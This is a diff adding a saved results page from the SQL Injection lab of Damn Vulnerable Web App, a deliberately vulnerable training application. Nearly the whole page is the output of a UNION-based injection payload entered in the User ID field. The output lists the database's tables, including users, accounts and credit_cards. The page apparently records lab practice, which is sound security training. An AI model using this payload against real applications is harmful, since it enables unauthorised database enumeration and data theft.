@@ -1,0 +1,176 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+
+
+		<title>Damn Vulnerable Web App (DVWA) v1.0.7 :: Vulnerability: SQL Injection</title>
+
+
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+
+
+	</head>
+
+
+
+	<body class="home">
+
+		<div id="container">
+
+
+
+			<div id="header">
+
+
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web App" />
+
+
+
+			</div>
+
+
+
+			<div id="main_menu">
+
+
+
+				<div id="main_menu_padded">
+
+				<ul><li onclick="window.location='../../.'" class=""><a href="../../.">Home</a></li><li onclick="window.location='../../instructions.php'" class=""><a href="../../instructions.php">Instructions</a></li><li onclick="window.location='../../setup.php'" class=""><a href="../../setup.php">Setup</a></li></ul><ul><li onclick="window.location='../../vulnerabilities/brute/.'" class=""><a href="../../vulnerabilities/brute/.">Brute Force</a></li><li onclick="window.location='../../vulnerabilities/exec/.'" class=""><a href="../../vulnerabilities/exec/.">Command Execution</a></li><li onclick="window.location='../../vulnerabilities/csrf/.'" class=""><a href="../../vulnerabilities/csrf/.">CSRF</a></li><li onclick="window.location='../../vulnerabilities/fi/.?page=include.php'" class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li><li onclick="window.location='../../vulnerabilities/sqli/.'" class="selected"><a href="../../vulnerabilities/sqli/.">SQL Injection</a></li><li onclick="window.location='../../vulnerabilities/sqli_blind/.'" class=""><a href="../../vulnerabilities/sqli_blind/.">SQL Injection (Blind)</a></li><li onclick="window.location='../../vulnerabilities/upload/.'" class=""><a href="../../vulnerabilities/upload/.">Upload</a></li><li onclick="window.location='../../vulnerabilities/xss_r/.'" class=""><a href="../../vulnerabilities/xss_r/.">XSS reflected</a></li><li onclick="window.location='../../vulnerabilities/xss_s/.'" class=""><a href="../../vulnerabilities/xss_s/.">XSS stored</a></li></ul><ul><li onclick="window.location='../../security.php'" class=""><a href="../../security.php">DVWA Security</a></li><li onclick="window.location='../../phpinfo.php'" class=""><a href="../../phpinfo.php">PHP Info</a></li><li onclick="window.location='../../about.php'" class=""><a href="../../about.php">About</a></li></ul><ul><li onclick="window.location='../../logout.php'" class=""><a href="../../logout.php">Logout</a></li></ul>
+
+				</div>
+
+
+
+			</div>
+
+
+
+			<div id="main_body">
+
+
+
+				
+
+<div class="body_padded">
+
+	<h1>Vulnerability: SQL Injection</h1>
+
+
+
+	
+
+
+
+	<div class="vulnerable_code_area">
+
+
+
+		<h3>User ID:</h3>
+
+
+
+		<form action="#" method="GET">
+
+			<input type="text" name="id">
+
+			<input type="submit" name="Submit" value="Submit">
+
+		</form>
+
+
+
+		<pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: admin<br>Surname: admin</pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: CHARACTER_SETS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: COLLATIONS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: COLLATION_CHARACTER_SET_APPLICABILITY<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: COLUMNS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: COLUMN_PRIVILEGES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: KEY_COLUMN_USAGE<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: PROFILING<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: ROUTINES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: SCHEMATA<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: SCHEMA_PRIVILEGES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: STATISTICS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: TABLES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: TABLE_CONSTRAINTS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: TABLE_PRIVILEGES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: TRIGGERS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: USER_PRIVILEGES<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: VIEWS<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: guestbook<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: columns_priv<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: db<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: func<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: help_category<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: help_keyword<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: help_relation<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: help_topic<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: host<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: proc<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: procs_priv<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tables_priv<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: time_zone<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: time_zone_leap_second<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: time_zone_name<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: time_zone_transition<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: time_zone_transition_type<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: user<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: accounts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: blogs_table<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: captured_data<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: credit_cards<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: hitlog<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: pen_test_tools<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_activities<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_activity_roles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_instance_activities<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_instance_comments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_instances<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_processes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_roles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_transitions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_user_roles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: galaxia_workitems<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: messu_archive<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: messu_messages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: messu_sent<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: sessions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_actionlog<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_article_types<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_articles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_banners<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_banning<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_banning_sections<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_blog_activity<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_blog_posts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_blog_posts_images<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_blogs<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_calendar_categories<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_calendar_items<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_calendar_locations<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_calendar_roles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_calendars<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_categories<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_categorized_objects<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_category_objects<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_category_sites<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_chart_items<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_charts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_charts_rankings<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_charts_votes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_chat_channels<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_chat_messages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_chat_users<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_comments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_content<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_content_templates<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_content_templates_sections<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_cookies<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_copyrights<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_directory_categories<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_directory_search<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_directory_sites<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_download<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_drawings<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_dsn<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_dynamic_variables<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_eph<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_extwiki<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_faq_questions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_faqs<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_featured_links<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_file_galleries<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_file_handlers<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_files<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_forum_attachments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_forum_reads<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_forums<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_forums_queue<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_forums_reported<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_friends<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_friendship_requests<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_galleries<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_galleries_scales<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_games<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_group_inclusion<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_history<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_hotwords<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_html_pages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_html_pages_dynamic_zones<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_images<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_images_data<br>Surname: </pre><pre
+>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_integrator_reps<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_integrator_rules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_language<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_languages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_link_cache<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_links<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_events<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_message_comments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_messages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_modules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_operators<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_live_support_requests<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_logs<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_mail_events<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_mailin_accounts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_menu_languages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_menu_options<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_menus<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_minical_events<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_minical_topics<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_modules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_newsletter_groups<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_newsletter_subscriptions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_newsletters<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_newsreader_marks<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_newsreader_servers<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_object_ratings<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_page_footnotes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_pages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_pageviews<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_poll_objects<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_poll_options<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_polls<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_preferences<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_private_messages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_programmed_content<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quicktags<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quiz_question_options<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quiz_questions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quiz_results<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quiz_stats<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quiz_stats_sum<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_quizzes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_received_articles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_received_pages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_referer_stats<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_related_categories<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_rss_feeds<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_rss_modules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_score<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_search_stats<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_searchindex<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_searchsyllable<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_searchwords<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_secdb<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_semaphores<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_sent_newsletters<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_sessions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_sheet_layout<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_sheet_values<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_sheets<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_shoutbox<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_shoutbox_words<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_stats<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_structure_versions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_structures<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_submissions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_suggested_faq_questions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_survey_question_options<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_survey_questions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_surveys<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tags<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_theme_control_categs<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_theme_control_objects<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_theme_control_sections<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_topics<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_fields<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_item_attachments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_item_comments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_item_fields<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_items<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_tracker_options<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_trackers<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_translated_objects<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_untranslated<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_answers<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_answers_uploads<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_assigned_modules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_bookmarks_folders<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_bookmarks_urls<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_mail_accounts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_menus<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_modules<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_notes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_postings<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_preferences<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_quizzes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_taken_quizzes<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_tasks<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_tasks_history<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_votings<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_user_watches<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_userfiles<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_userpoints<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_users<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_users_score<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_webmail_contacts<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_webmail_messages<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_wiki_attachments<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: tiki_zones<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_grouppermissions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_groups<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_objectpermissions<br>Surname: </pre><pre>ID: 1' UNION SELECT table_name, null FROM information_schema.tables #<br>First name: users_permissions<br>Surname: 